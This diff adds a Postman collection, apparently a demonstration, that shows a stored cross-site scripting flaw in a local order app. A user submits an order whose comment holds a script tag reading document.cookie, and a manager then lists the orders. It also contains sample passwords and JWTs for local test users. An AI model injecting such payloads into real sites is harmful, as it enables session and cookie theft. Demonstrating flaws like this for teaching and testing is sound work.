@@ -1,0 +1,147 @@
+{
+	"info": {
+		"_postman_id": "e68b5307-341b-40be-a205-281b0ed2e8c5",
+		"name": "XSS Vulnerabilities",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "7173585"
+	},
+	"item": [
+		{
+			"name": "User logs in",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "emailId",
+							"value": "jane@email.com",
+							"type": "text"
+						},
+						{
+							"key": "password",
+							"value": "fooBarb@z8",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://localhost:8080/login",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "User creates order (with XSS in comment field)",
+			"request": {
+				"auth": {
+					"type": "bearer",
+					"bearer": [
+						{
+							"key": "token",
+							"value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiUk9MRV9SRVBPUlRFRSIsImlzcyI6InNpbXBseXNlbmQiLCJ1c2VybmFtZSI6ImphbmVAZW1haWwuY29tIn0.LGVObQ3bkQH0Yt1q9tH-yMQ90mK8m59fPvPyc3h2nao",
+							"type": "string"
+						}
+					]
+				},
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"reason\": \"Need Linux CD\",\r\n    \"comment\":\"<script>alert(document.cookie)</script>\",\r\n    \"items\": [\r\n        {\r\n            \"id\": 3\r\n        }\r\n    ]\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://localhost:8080/v1/orders",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"v1",
+						"orders"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Manager logs in",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "emailId",
+							"value": "john@email.com",
+							"type": "text"
+						},
+						{
+							"key": "password",
+							"value": "abcd1234#",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://localhost:8080/login",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Manager lists orders",
+			"request": {
+				"auth": {
+					"type": "bearer",
+					"bearer": [
+						{
+							"key": "token",
+							"value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiUk9MRV9NR1IiLCJpc3MiOiJzaW1wbHlzZW5kIiwidXNlcm5hbWUiOiJqb2huQGVtYWlsLmNvbSJ9.AQaC6hPVE57-OuCfR7OgP00-Qda5aU1ZPD9nhbE9THQ",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:8080/v1/orders",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"v1",
+						"orders"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
